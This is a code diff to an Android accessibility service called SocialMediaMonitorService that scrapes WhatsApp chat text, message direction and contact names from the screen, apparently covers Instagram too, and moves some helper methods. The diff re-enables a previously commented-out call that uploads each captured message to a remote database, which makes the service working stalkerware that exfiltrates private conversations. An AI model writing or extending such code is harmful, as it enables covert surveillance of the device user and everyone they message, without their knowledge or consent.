@@ -6,6 +6,7 @@ import android.graphics.Rect;
 import android.os.Build;
 import android.util.DisplayMetrics;
 import android.util.Log;
+import android.view.View;
 import android.view.accessibility.AccessibilityEvent;
 import android.view.accessibility.AccessibilityNodeInfo;
 
@@ -137,6 +138,7 @@ public class SocialMediaMonitorService extends AccessibilityService {
                 sanitizedMessage = sanitizedMessage.substring(0, MAX_MESSAGE_LENGTH);
             }
 
+            String messageDirection = messageInfo.isOutgoing ? "outgoing" : "incoming";
             String messageKey = sanitizedMessage + "|" + messageInfo.isOutgoing + "|" + sanitizedContactName;
 
             if (processedMessages.add(messageKey)) {
@@ -156,65 +158,72 @@ public class SocialMediaMonitorService extends AccessibilityService {
                 // Call the helper method to upload message data
                 String userId = getUserId(); // Replace with actual user ID
                 String phoneModel = getDeviceModel(); // Replace with actual phone model
-                String uniqueMessageId = sanitizedContactName + "|" + messageInfo.isOutgoing + "|" + sanitizedMessage + "|" + System.currentTimeMillis();
+                String uniqueMessageId = sanitizedContactName + "|" + System.currentTimeMillis() + "|" + messageDirection + "|" + sanitizedMessage;
                 String messageDate = new SimpleDateFormat("yyyy-MM-dd", Locale.getDefault()).format(new Date());
 
                 DatabaseHelper databaseHelper = new DatabaseHelper();
-                //databaseHelper.uploadSocialMessageData(userId, phoneModel, messageData, uniqueMessageId, messageDate, "whatsapp");
+                databaseHelper.uploadSocialMessageData(userId, phoneModel, messageData, uniqueMessageId, messageDate, "whatsapp");
             }
         }
     }
 
-    // Helper method to sanitize messages and names to avoid Firebase path issues
-    private String sanitizeData(String input) {
-        if (input == null) {
-            return "";
-        }
 
-        // Remove characters that Firebase does not allow
-        return input.replaceAll("[.#$\\[\\]/]", "_");
-    }
+
+
 
     private boolean isWhatsappOutgoingMessage(AccessibilityNodeInfo node) {
         if (node == null) {
             return false;
         }
 
-        // Get the node's position on screen
-        Rect nodePosition = new Rect();
-        node.getBoundsInScreen(nodePosition);
+        // Check if node has the ID "message_text"
+        if (node.getViewIdResourceName() != null && node.getViewIdResourceName().contains("message_text")) {
+            AccessibilityNodeInfo parentNode = node.getParent();
+            if (parentNode != null) {
+                Rect nodePosition = new Rect();
+                parentNode.getBoundsInScreen(nodePosition);
 
-        // Get screen width
-        DisplayMetrics displayMetrics = getResources().getDisplayMetrics();
-        int screenWidth = displayMetrics.widthPixels;
+                DisplayMetrics displayMetrics = getResources().getDisplayMetrics();
+                int screenWidth = displayMetrics.widthPixels;
 
-        // Calculate center point of the message
-        int messageCenter = (nodePosition.left + nodePosition.right) / 2;
-
-        // If message center is in the right half of the screen, it's outgoing
-        return messageCenter > (screenWidth / 2);
-    }
-
-    // Helper method to log the view hierarchy for debugging
-    private void logViewHierarchy(AccessibilityNodeInfo node, int depth) {
-        if (node == null) return;
-
-        StringBuilder indent = new StringBuilder();
-        for (int i = 0; i < depth; i++) {
-            indent.append("  ");
-        }
-
-        String viewId = node.getViewIdResourceName();
-        Log.d("SocialMediaMonitorService", indent + "Node: " + viewId);
-
-        for (int i = 0; i < node.getChildCount(); i++) {
-            AccessibilityNodeInfo child = node.getChild(i);
-            if (child != null) {
-                logViewHierarchy(child, depth + 1);
-                child.recycle();
+                int messageCenter = (nodePosition.left + nodePosition.right) / 2;
+                return messageCenter > (screenWidth / 2);
             }
         }
+
+        return false;
     }
+
+
+    private List<MessageInfo> extractWhatsappMessages(AccessibilityNodeInfo rootNode) {
+        List<MessageInfo> messages = new ArrayList<>();
+        List<AccessibilityNodeInfo> messageContainers = rootNode.findAccessibilityNodeInfosByViewId(WHATSAPP_PACKAGE + ":id/message_text");
+
+        for (AccessibilityNodeInfo container : messageContainers) {
+            if (container != null && container.getText() != null) {
+                String messageText = container.getText().toString();
+                boolean isOutgoing = isWhatsappOutgoingMessage(container);
+                messages.add(new MessageInfo(messageText, isOutgoing));
+            }
+        }
+
+        return messages;
+    }
+
+    private String extractContactName(AccessibilityNodeInfo rootNode) {
+        List<AccessibilityNodeInfo> nodes = rootNode.findAccessibilityNodeInfosByViewId(WHATSAPP_PACKAGE + ":id/conversation_contact_name");
+        if (!nodes.isEmpty() && nodes.get(0) != null && nodes.get(0).getText() != null) {
+            return nodes.get(0).getText().toString();
+        }
+
+        nodes = rootNode.findAccessibilityNodeInfosByViewId(WHATSAPP_PACKAGE + ":id/conversation_title");
+        if (!nodes.isEmpty() && nodes.get(0) != null && nodes.get(0).getText() != null) {
+            return nodes.get(0).getText().toString();
+        }
+
+        return "Unknown Contact";
+    }
+
 
     private void processInstagramMessages(AccessibilityNodeInfo rootNode) {
         Log.d(TAG, "Processing Instagram messages. Root node available: " + (rootNode != null));
@@ -262,19 +271,7 @@ public class SocialMediaMonitorService extends AccessibilityService {
         }
     }
 
-    private String extractContactName(AccessibilityNodeInfo rootNode) {
-        List<AccessibilityNodeInfo> nodes = rootNode.findAccessibilityNodeInfosByViewId(WHATSAPP_PACKAGE + ":id/conversation_contact_name");
-        if (!nodes.isEmpty() && nodes.get(0) != null && nodes.get(0).getText() != null) {
-            return nodes.get(0).getText().toString();
-        }
 
-        nodes = rootNode.findAccessibilityNodeInfosByViewId(WHATSAPP_PACKAGE + ":id/conversation_title");
-        if (!nodes.isEmpty() && nodes.get(0) != null && nodes.get(0).getText() != null) {
-            return nodes.get(0).getText().toString();
-        }
-
-        return "Unknown Contact";
-    }
 
     private boolean isInstagramChatScreen(AccessibilityNodeInfo rootNode) {
         if (rootNode == null) return false;
@@ -498,21 +495,6 @@ public class SocialMediaMonitorService extends AccessibilityService {
         return null;
     }
 
-
-    private List<MessageInfo> extractWhatsappMessages(AccessibilityNodeInfo rootNode) {
-        List<MessageInfo> messages = new ArrayList<>();
-        List<AccessibilityNodeInfo> messageContainers = rootNode.findAccessibilityNodeInfosByViewId(WHATSAPP_PACKAGE + ":id/message_text");
-
-        for (AccessibilityNodeInfo container : messageContainers) {
-            if (container != null && container.getText() != null) {
-                String messageText = container.getText().toString();
-                boolean isOutgoing = isWhatsappOutgoingMessage(container);
-                messages.add(new MessageInfo(messageText, isOutgoing));
-            }
-        }
-
-        return messages;
-    }
 
 
     private List<MessageInfo> extractInstagramMessages(AccessibilityNodeInfo rootNode) {
@@ -776,6 +758,17 @@ public class SocialMediaMonitorService extends AccessibilityService {
         if (node == null || node.getText() == null) return null;
         return node.getText().toString().trim();
     }
+
+    // Helper method to sanitize messages and names to avoid Firebase path issues
+    private String sanitizeData(String input) {
+        if (input == null) {
+            return "";
+        }
+
+        // Remove characters that Firebase does not allow
+        return input.replaceAll("[.#$\\[\\]/]", "_");
+    }
+
 
     @Override
     public void onInterrupt() {
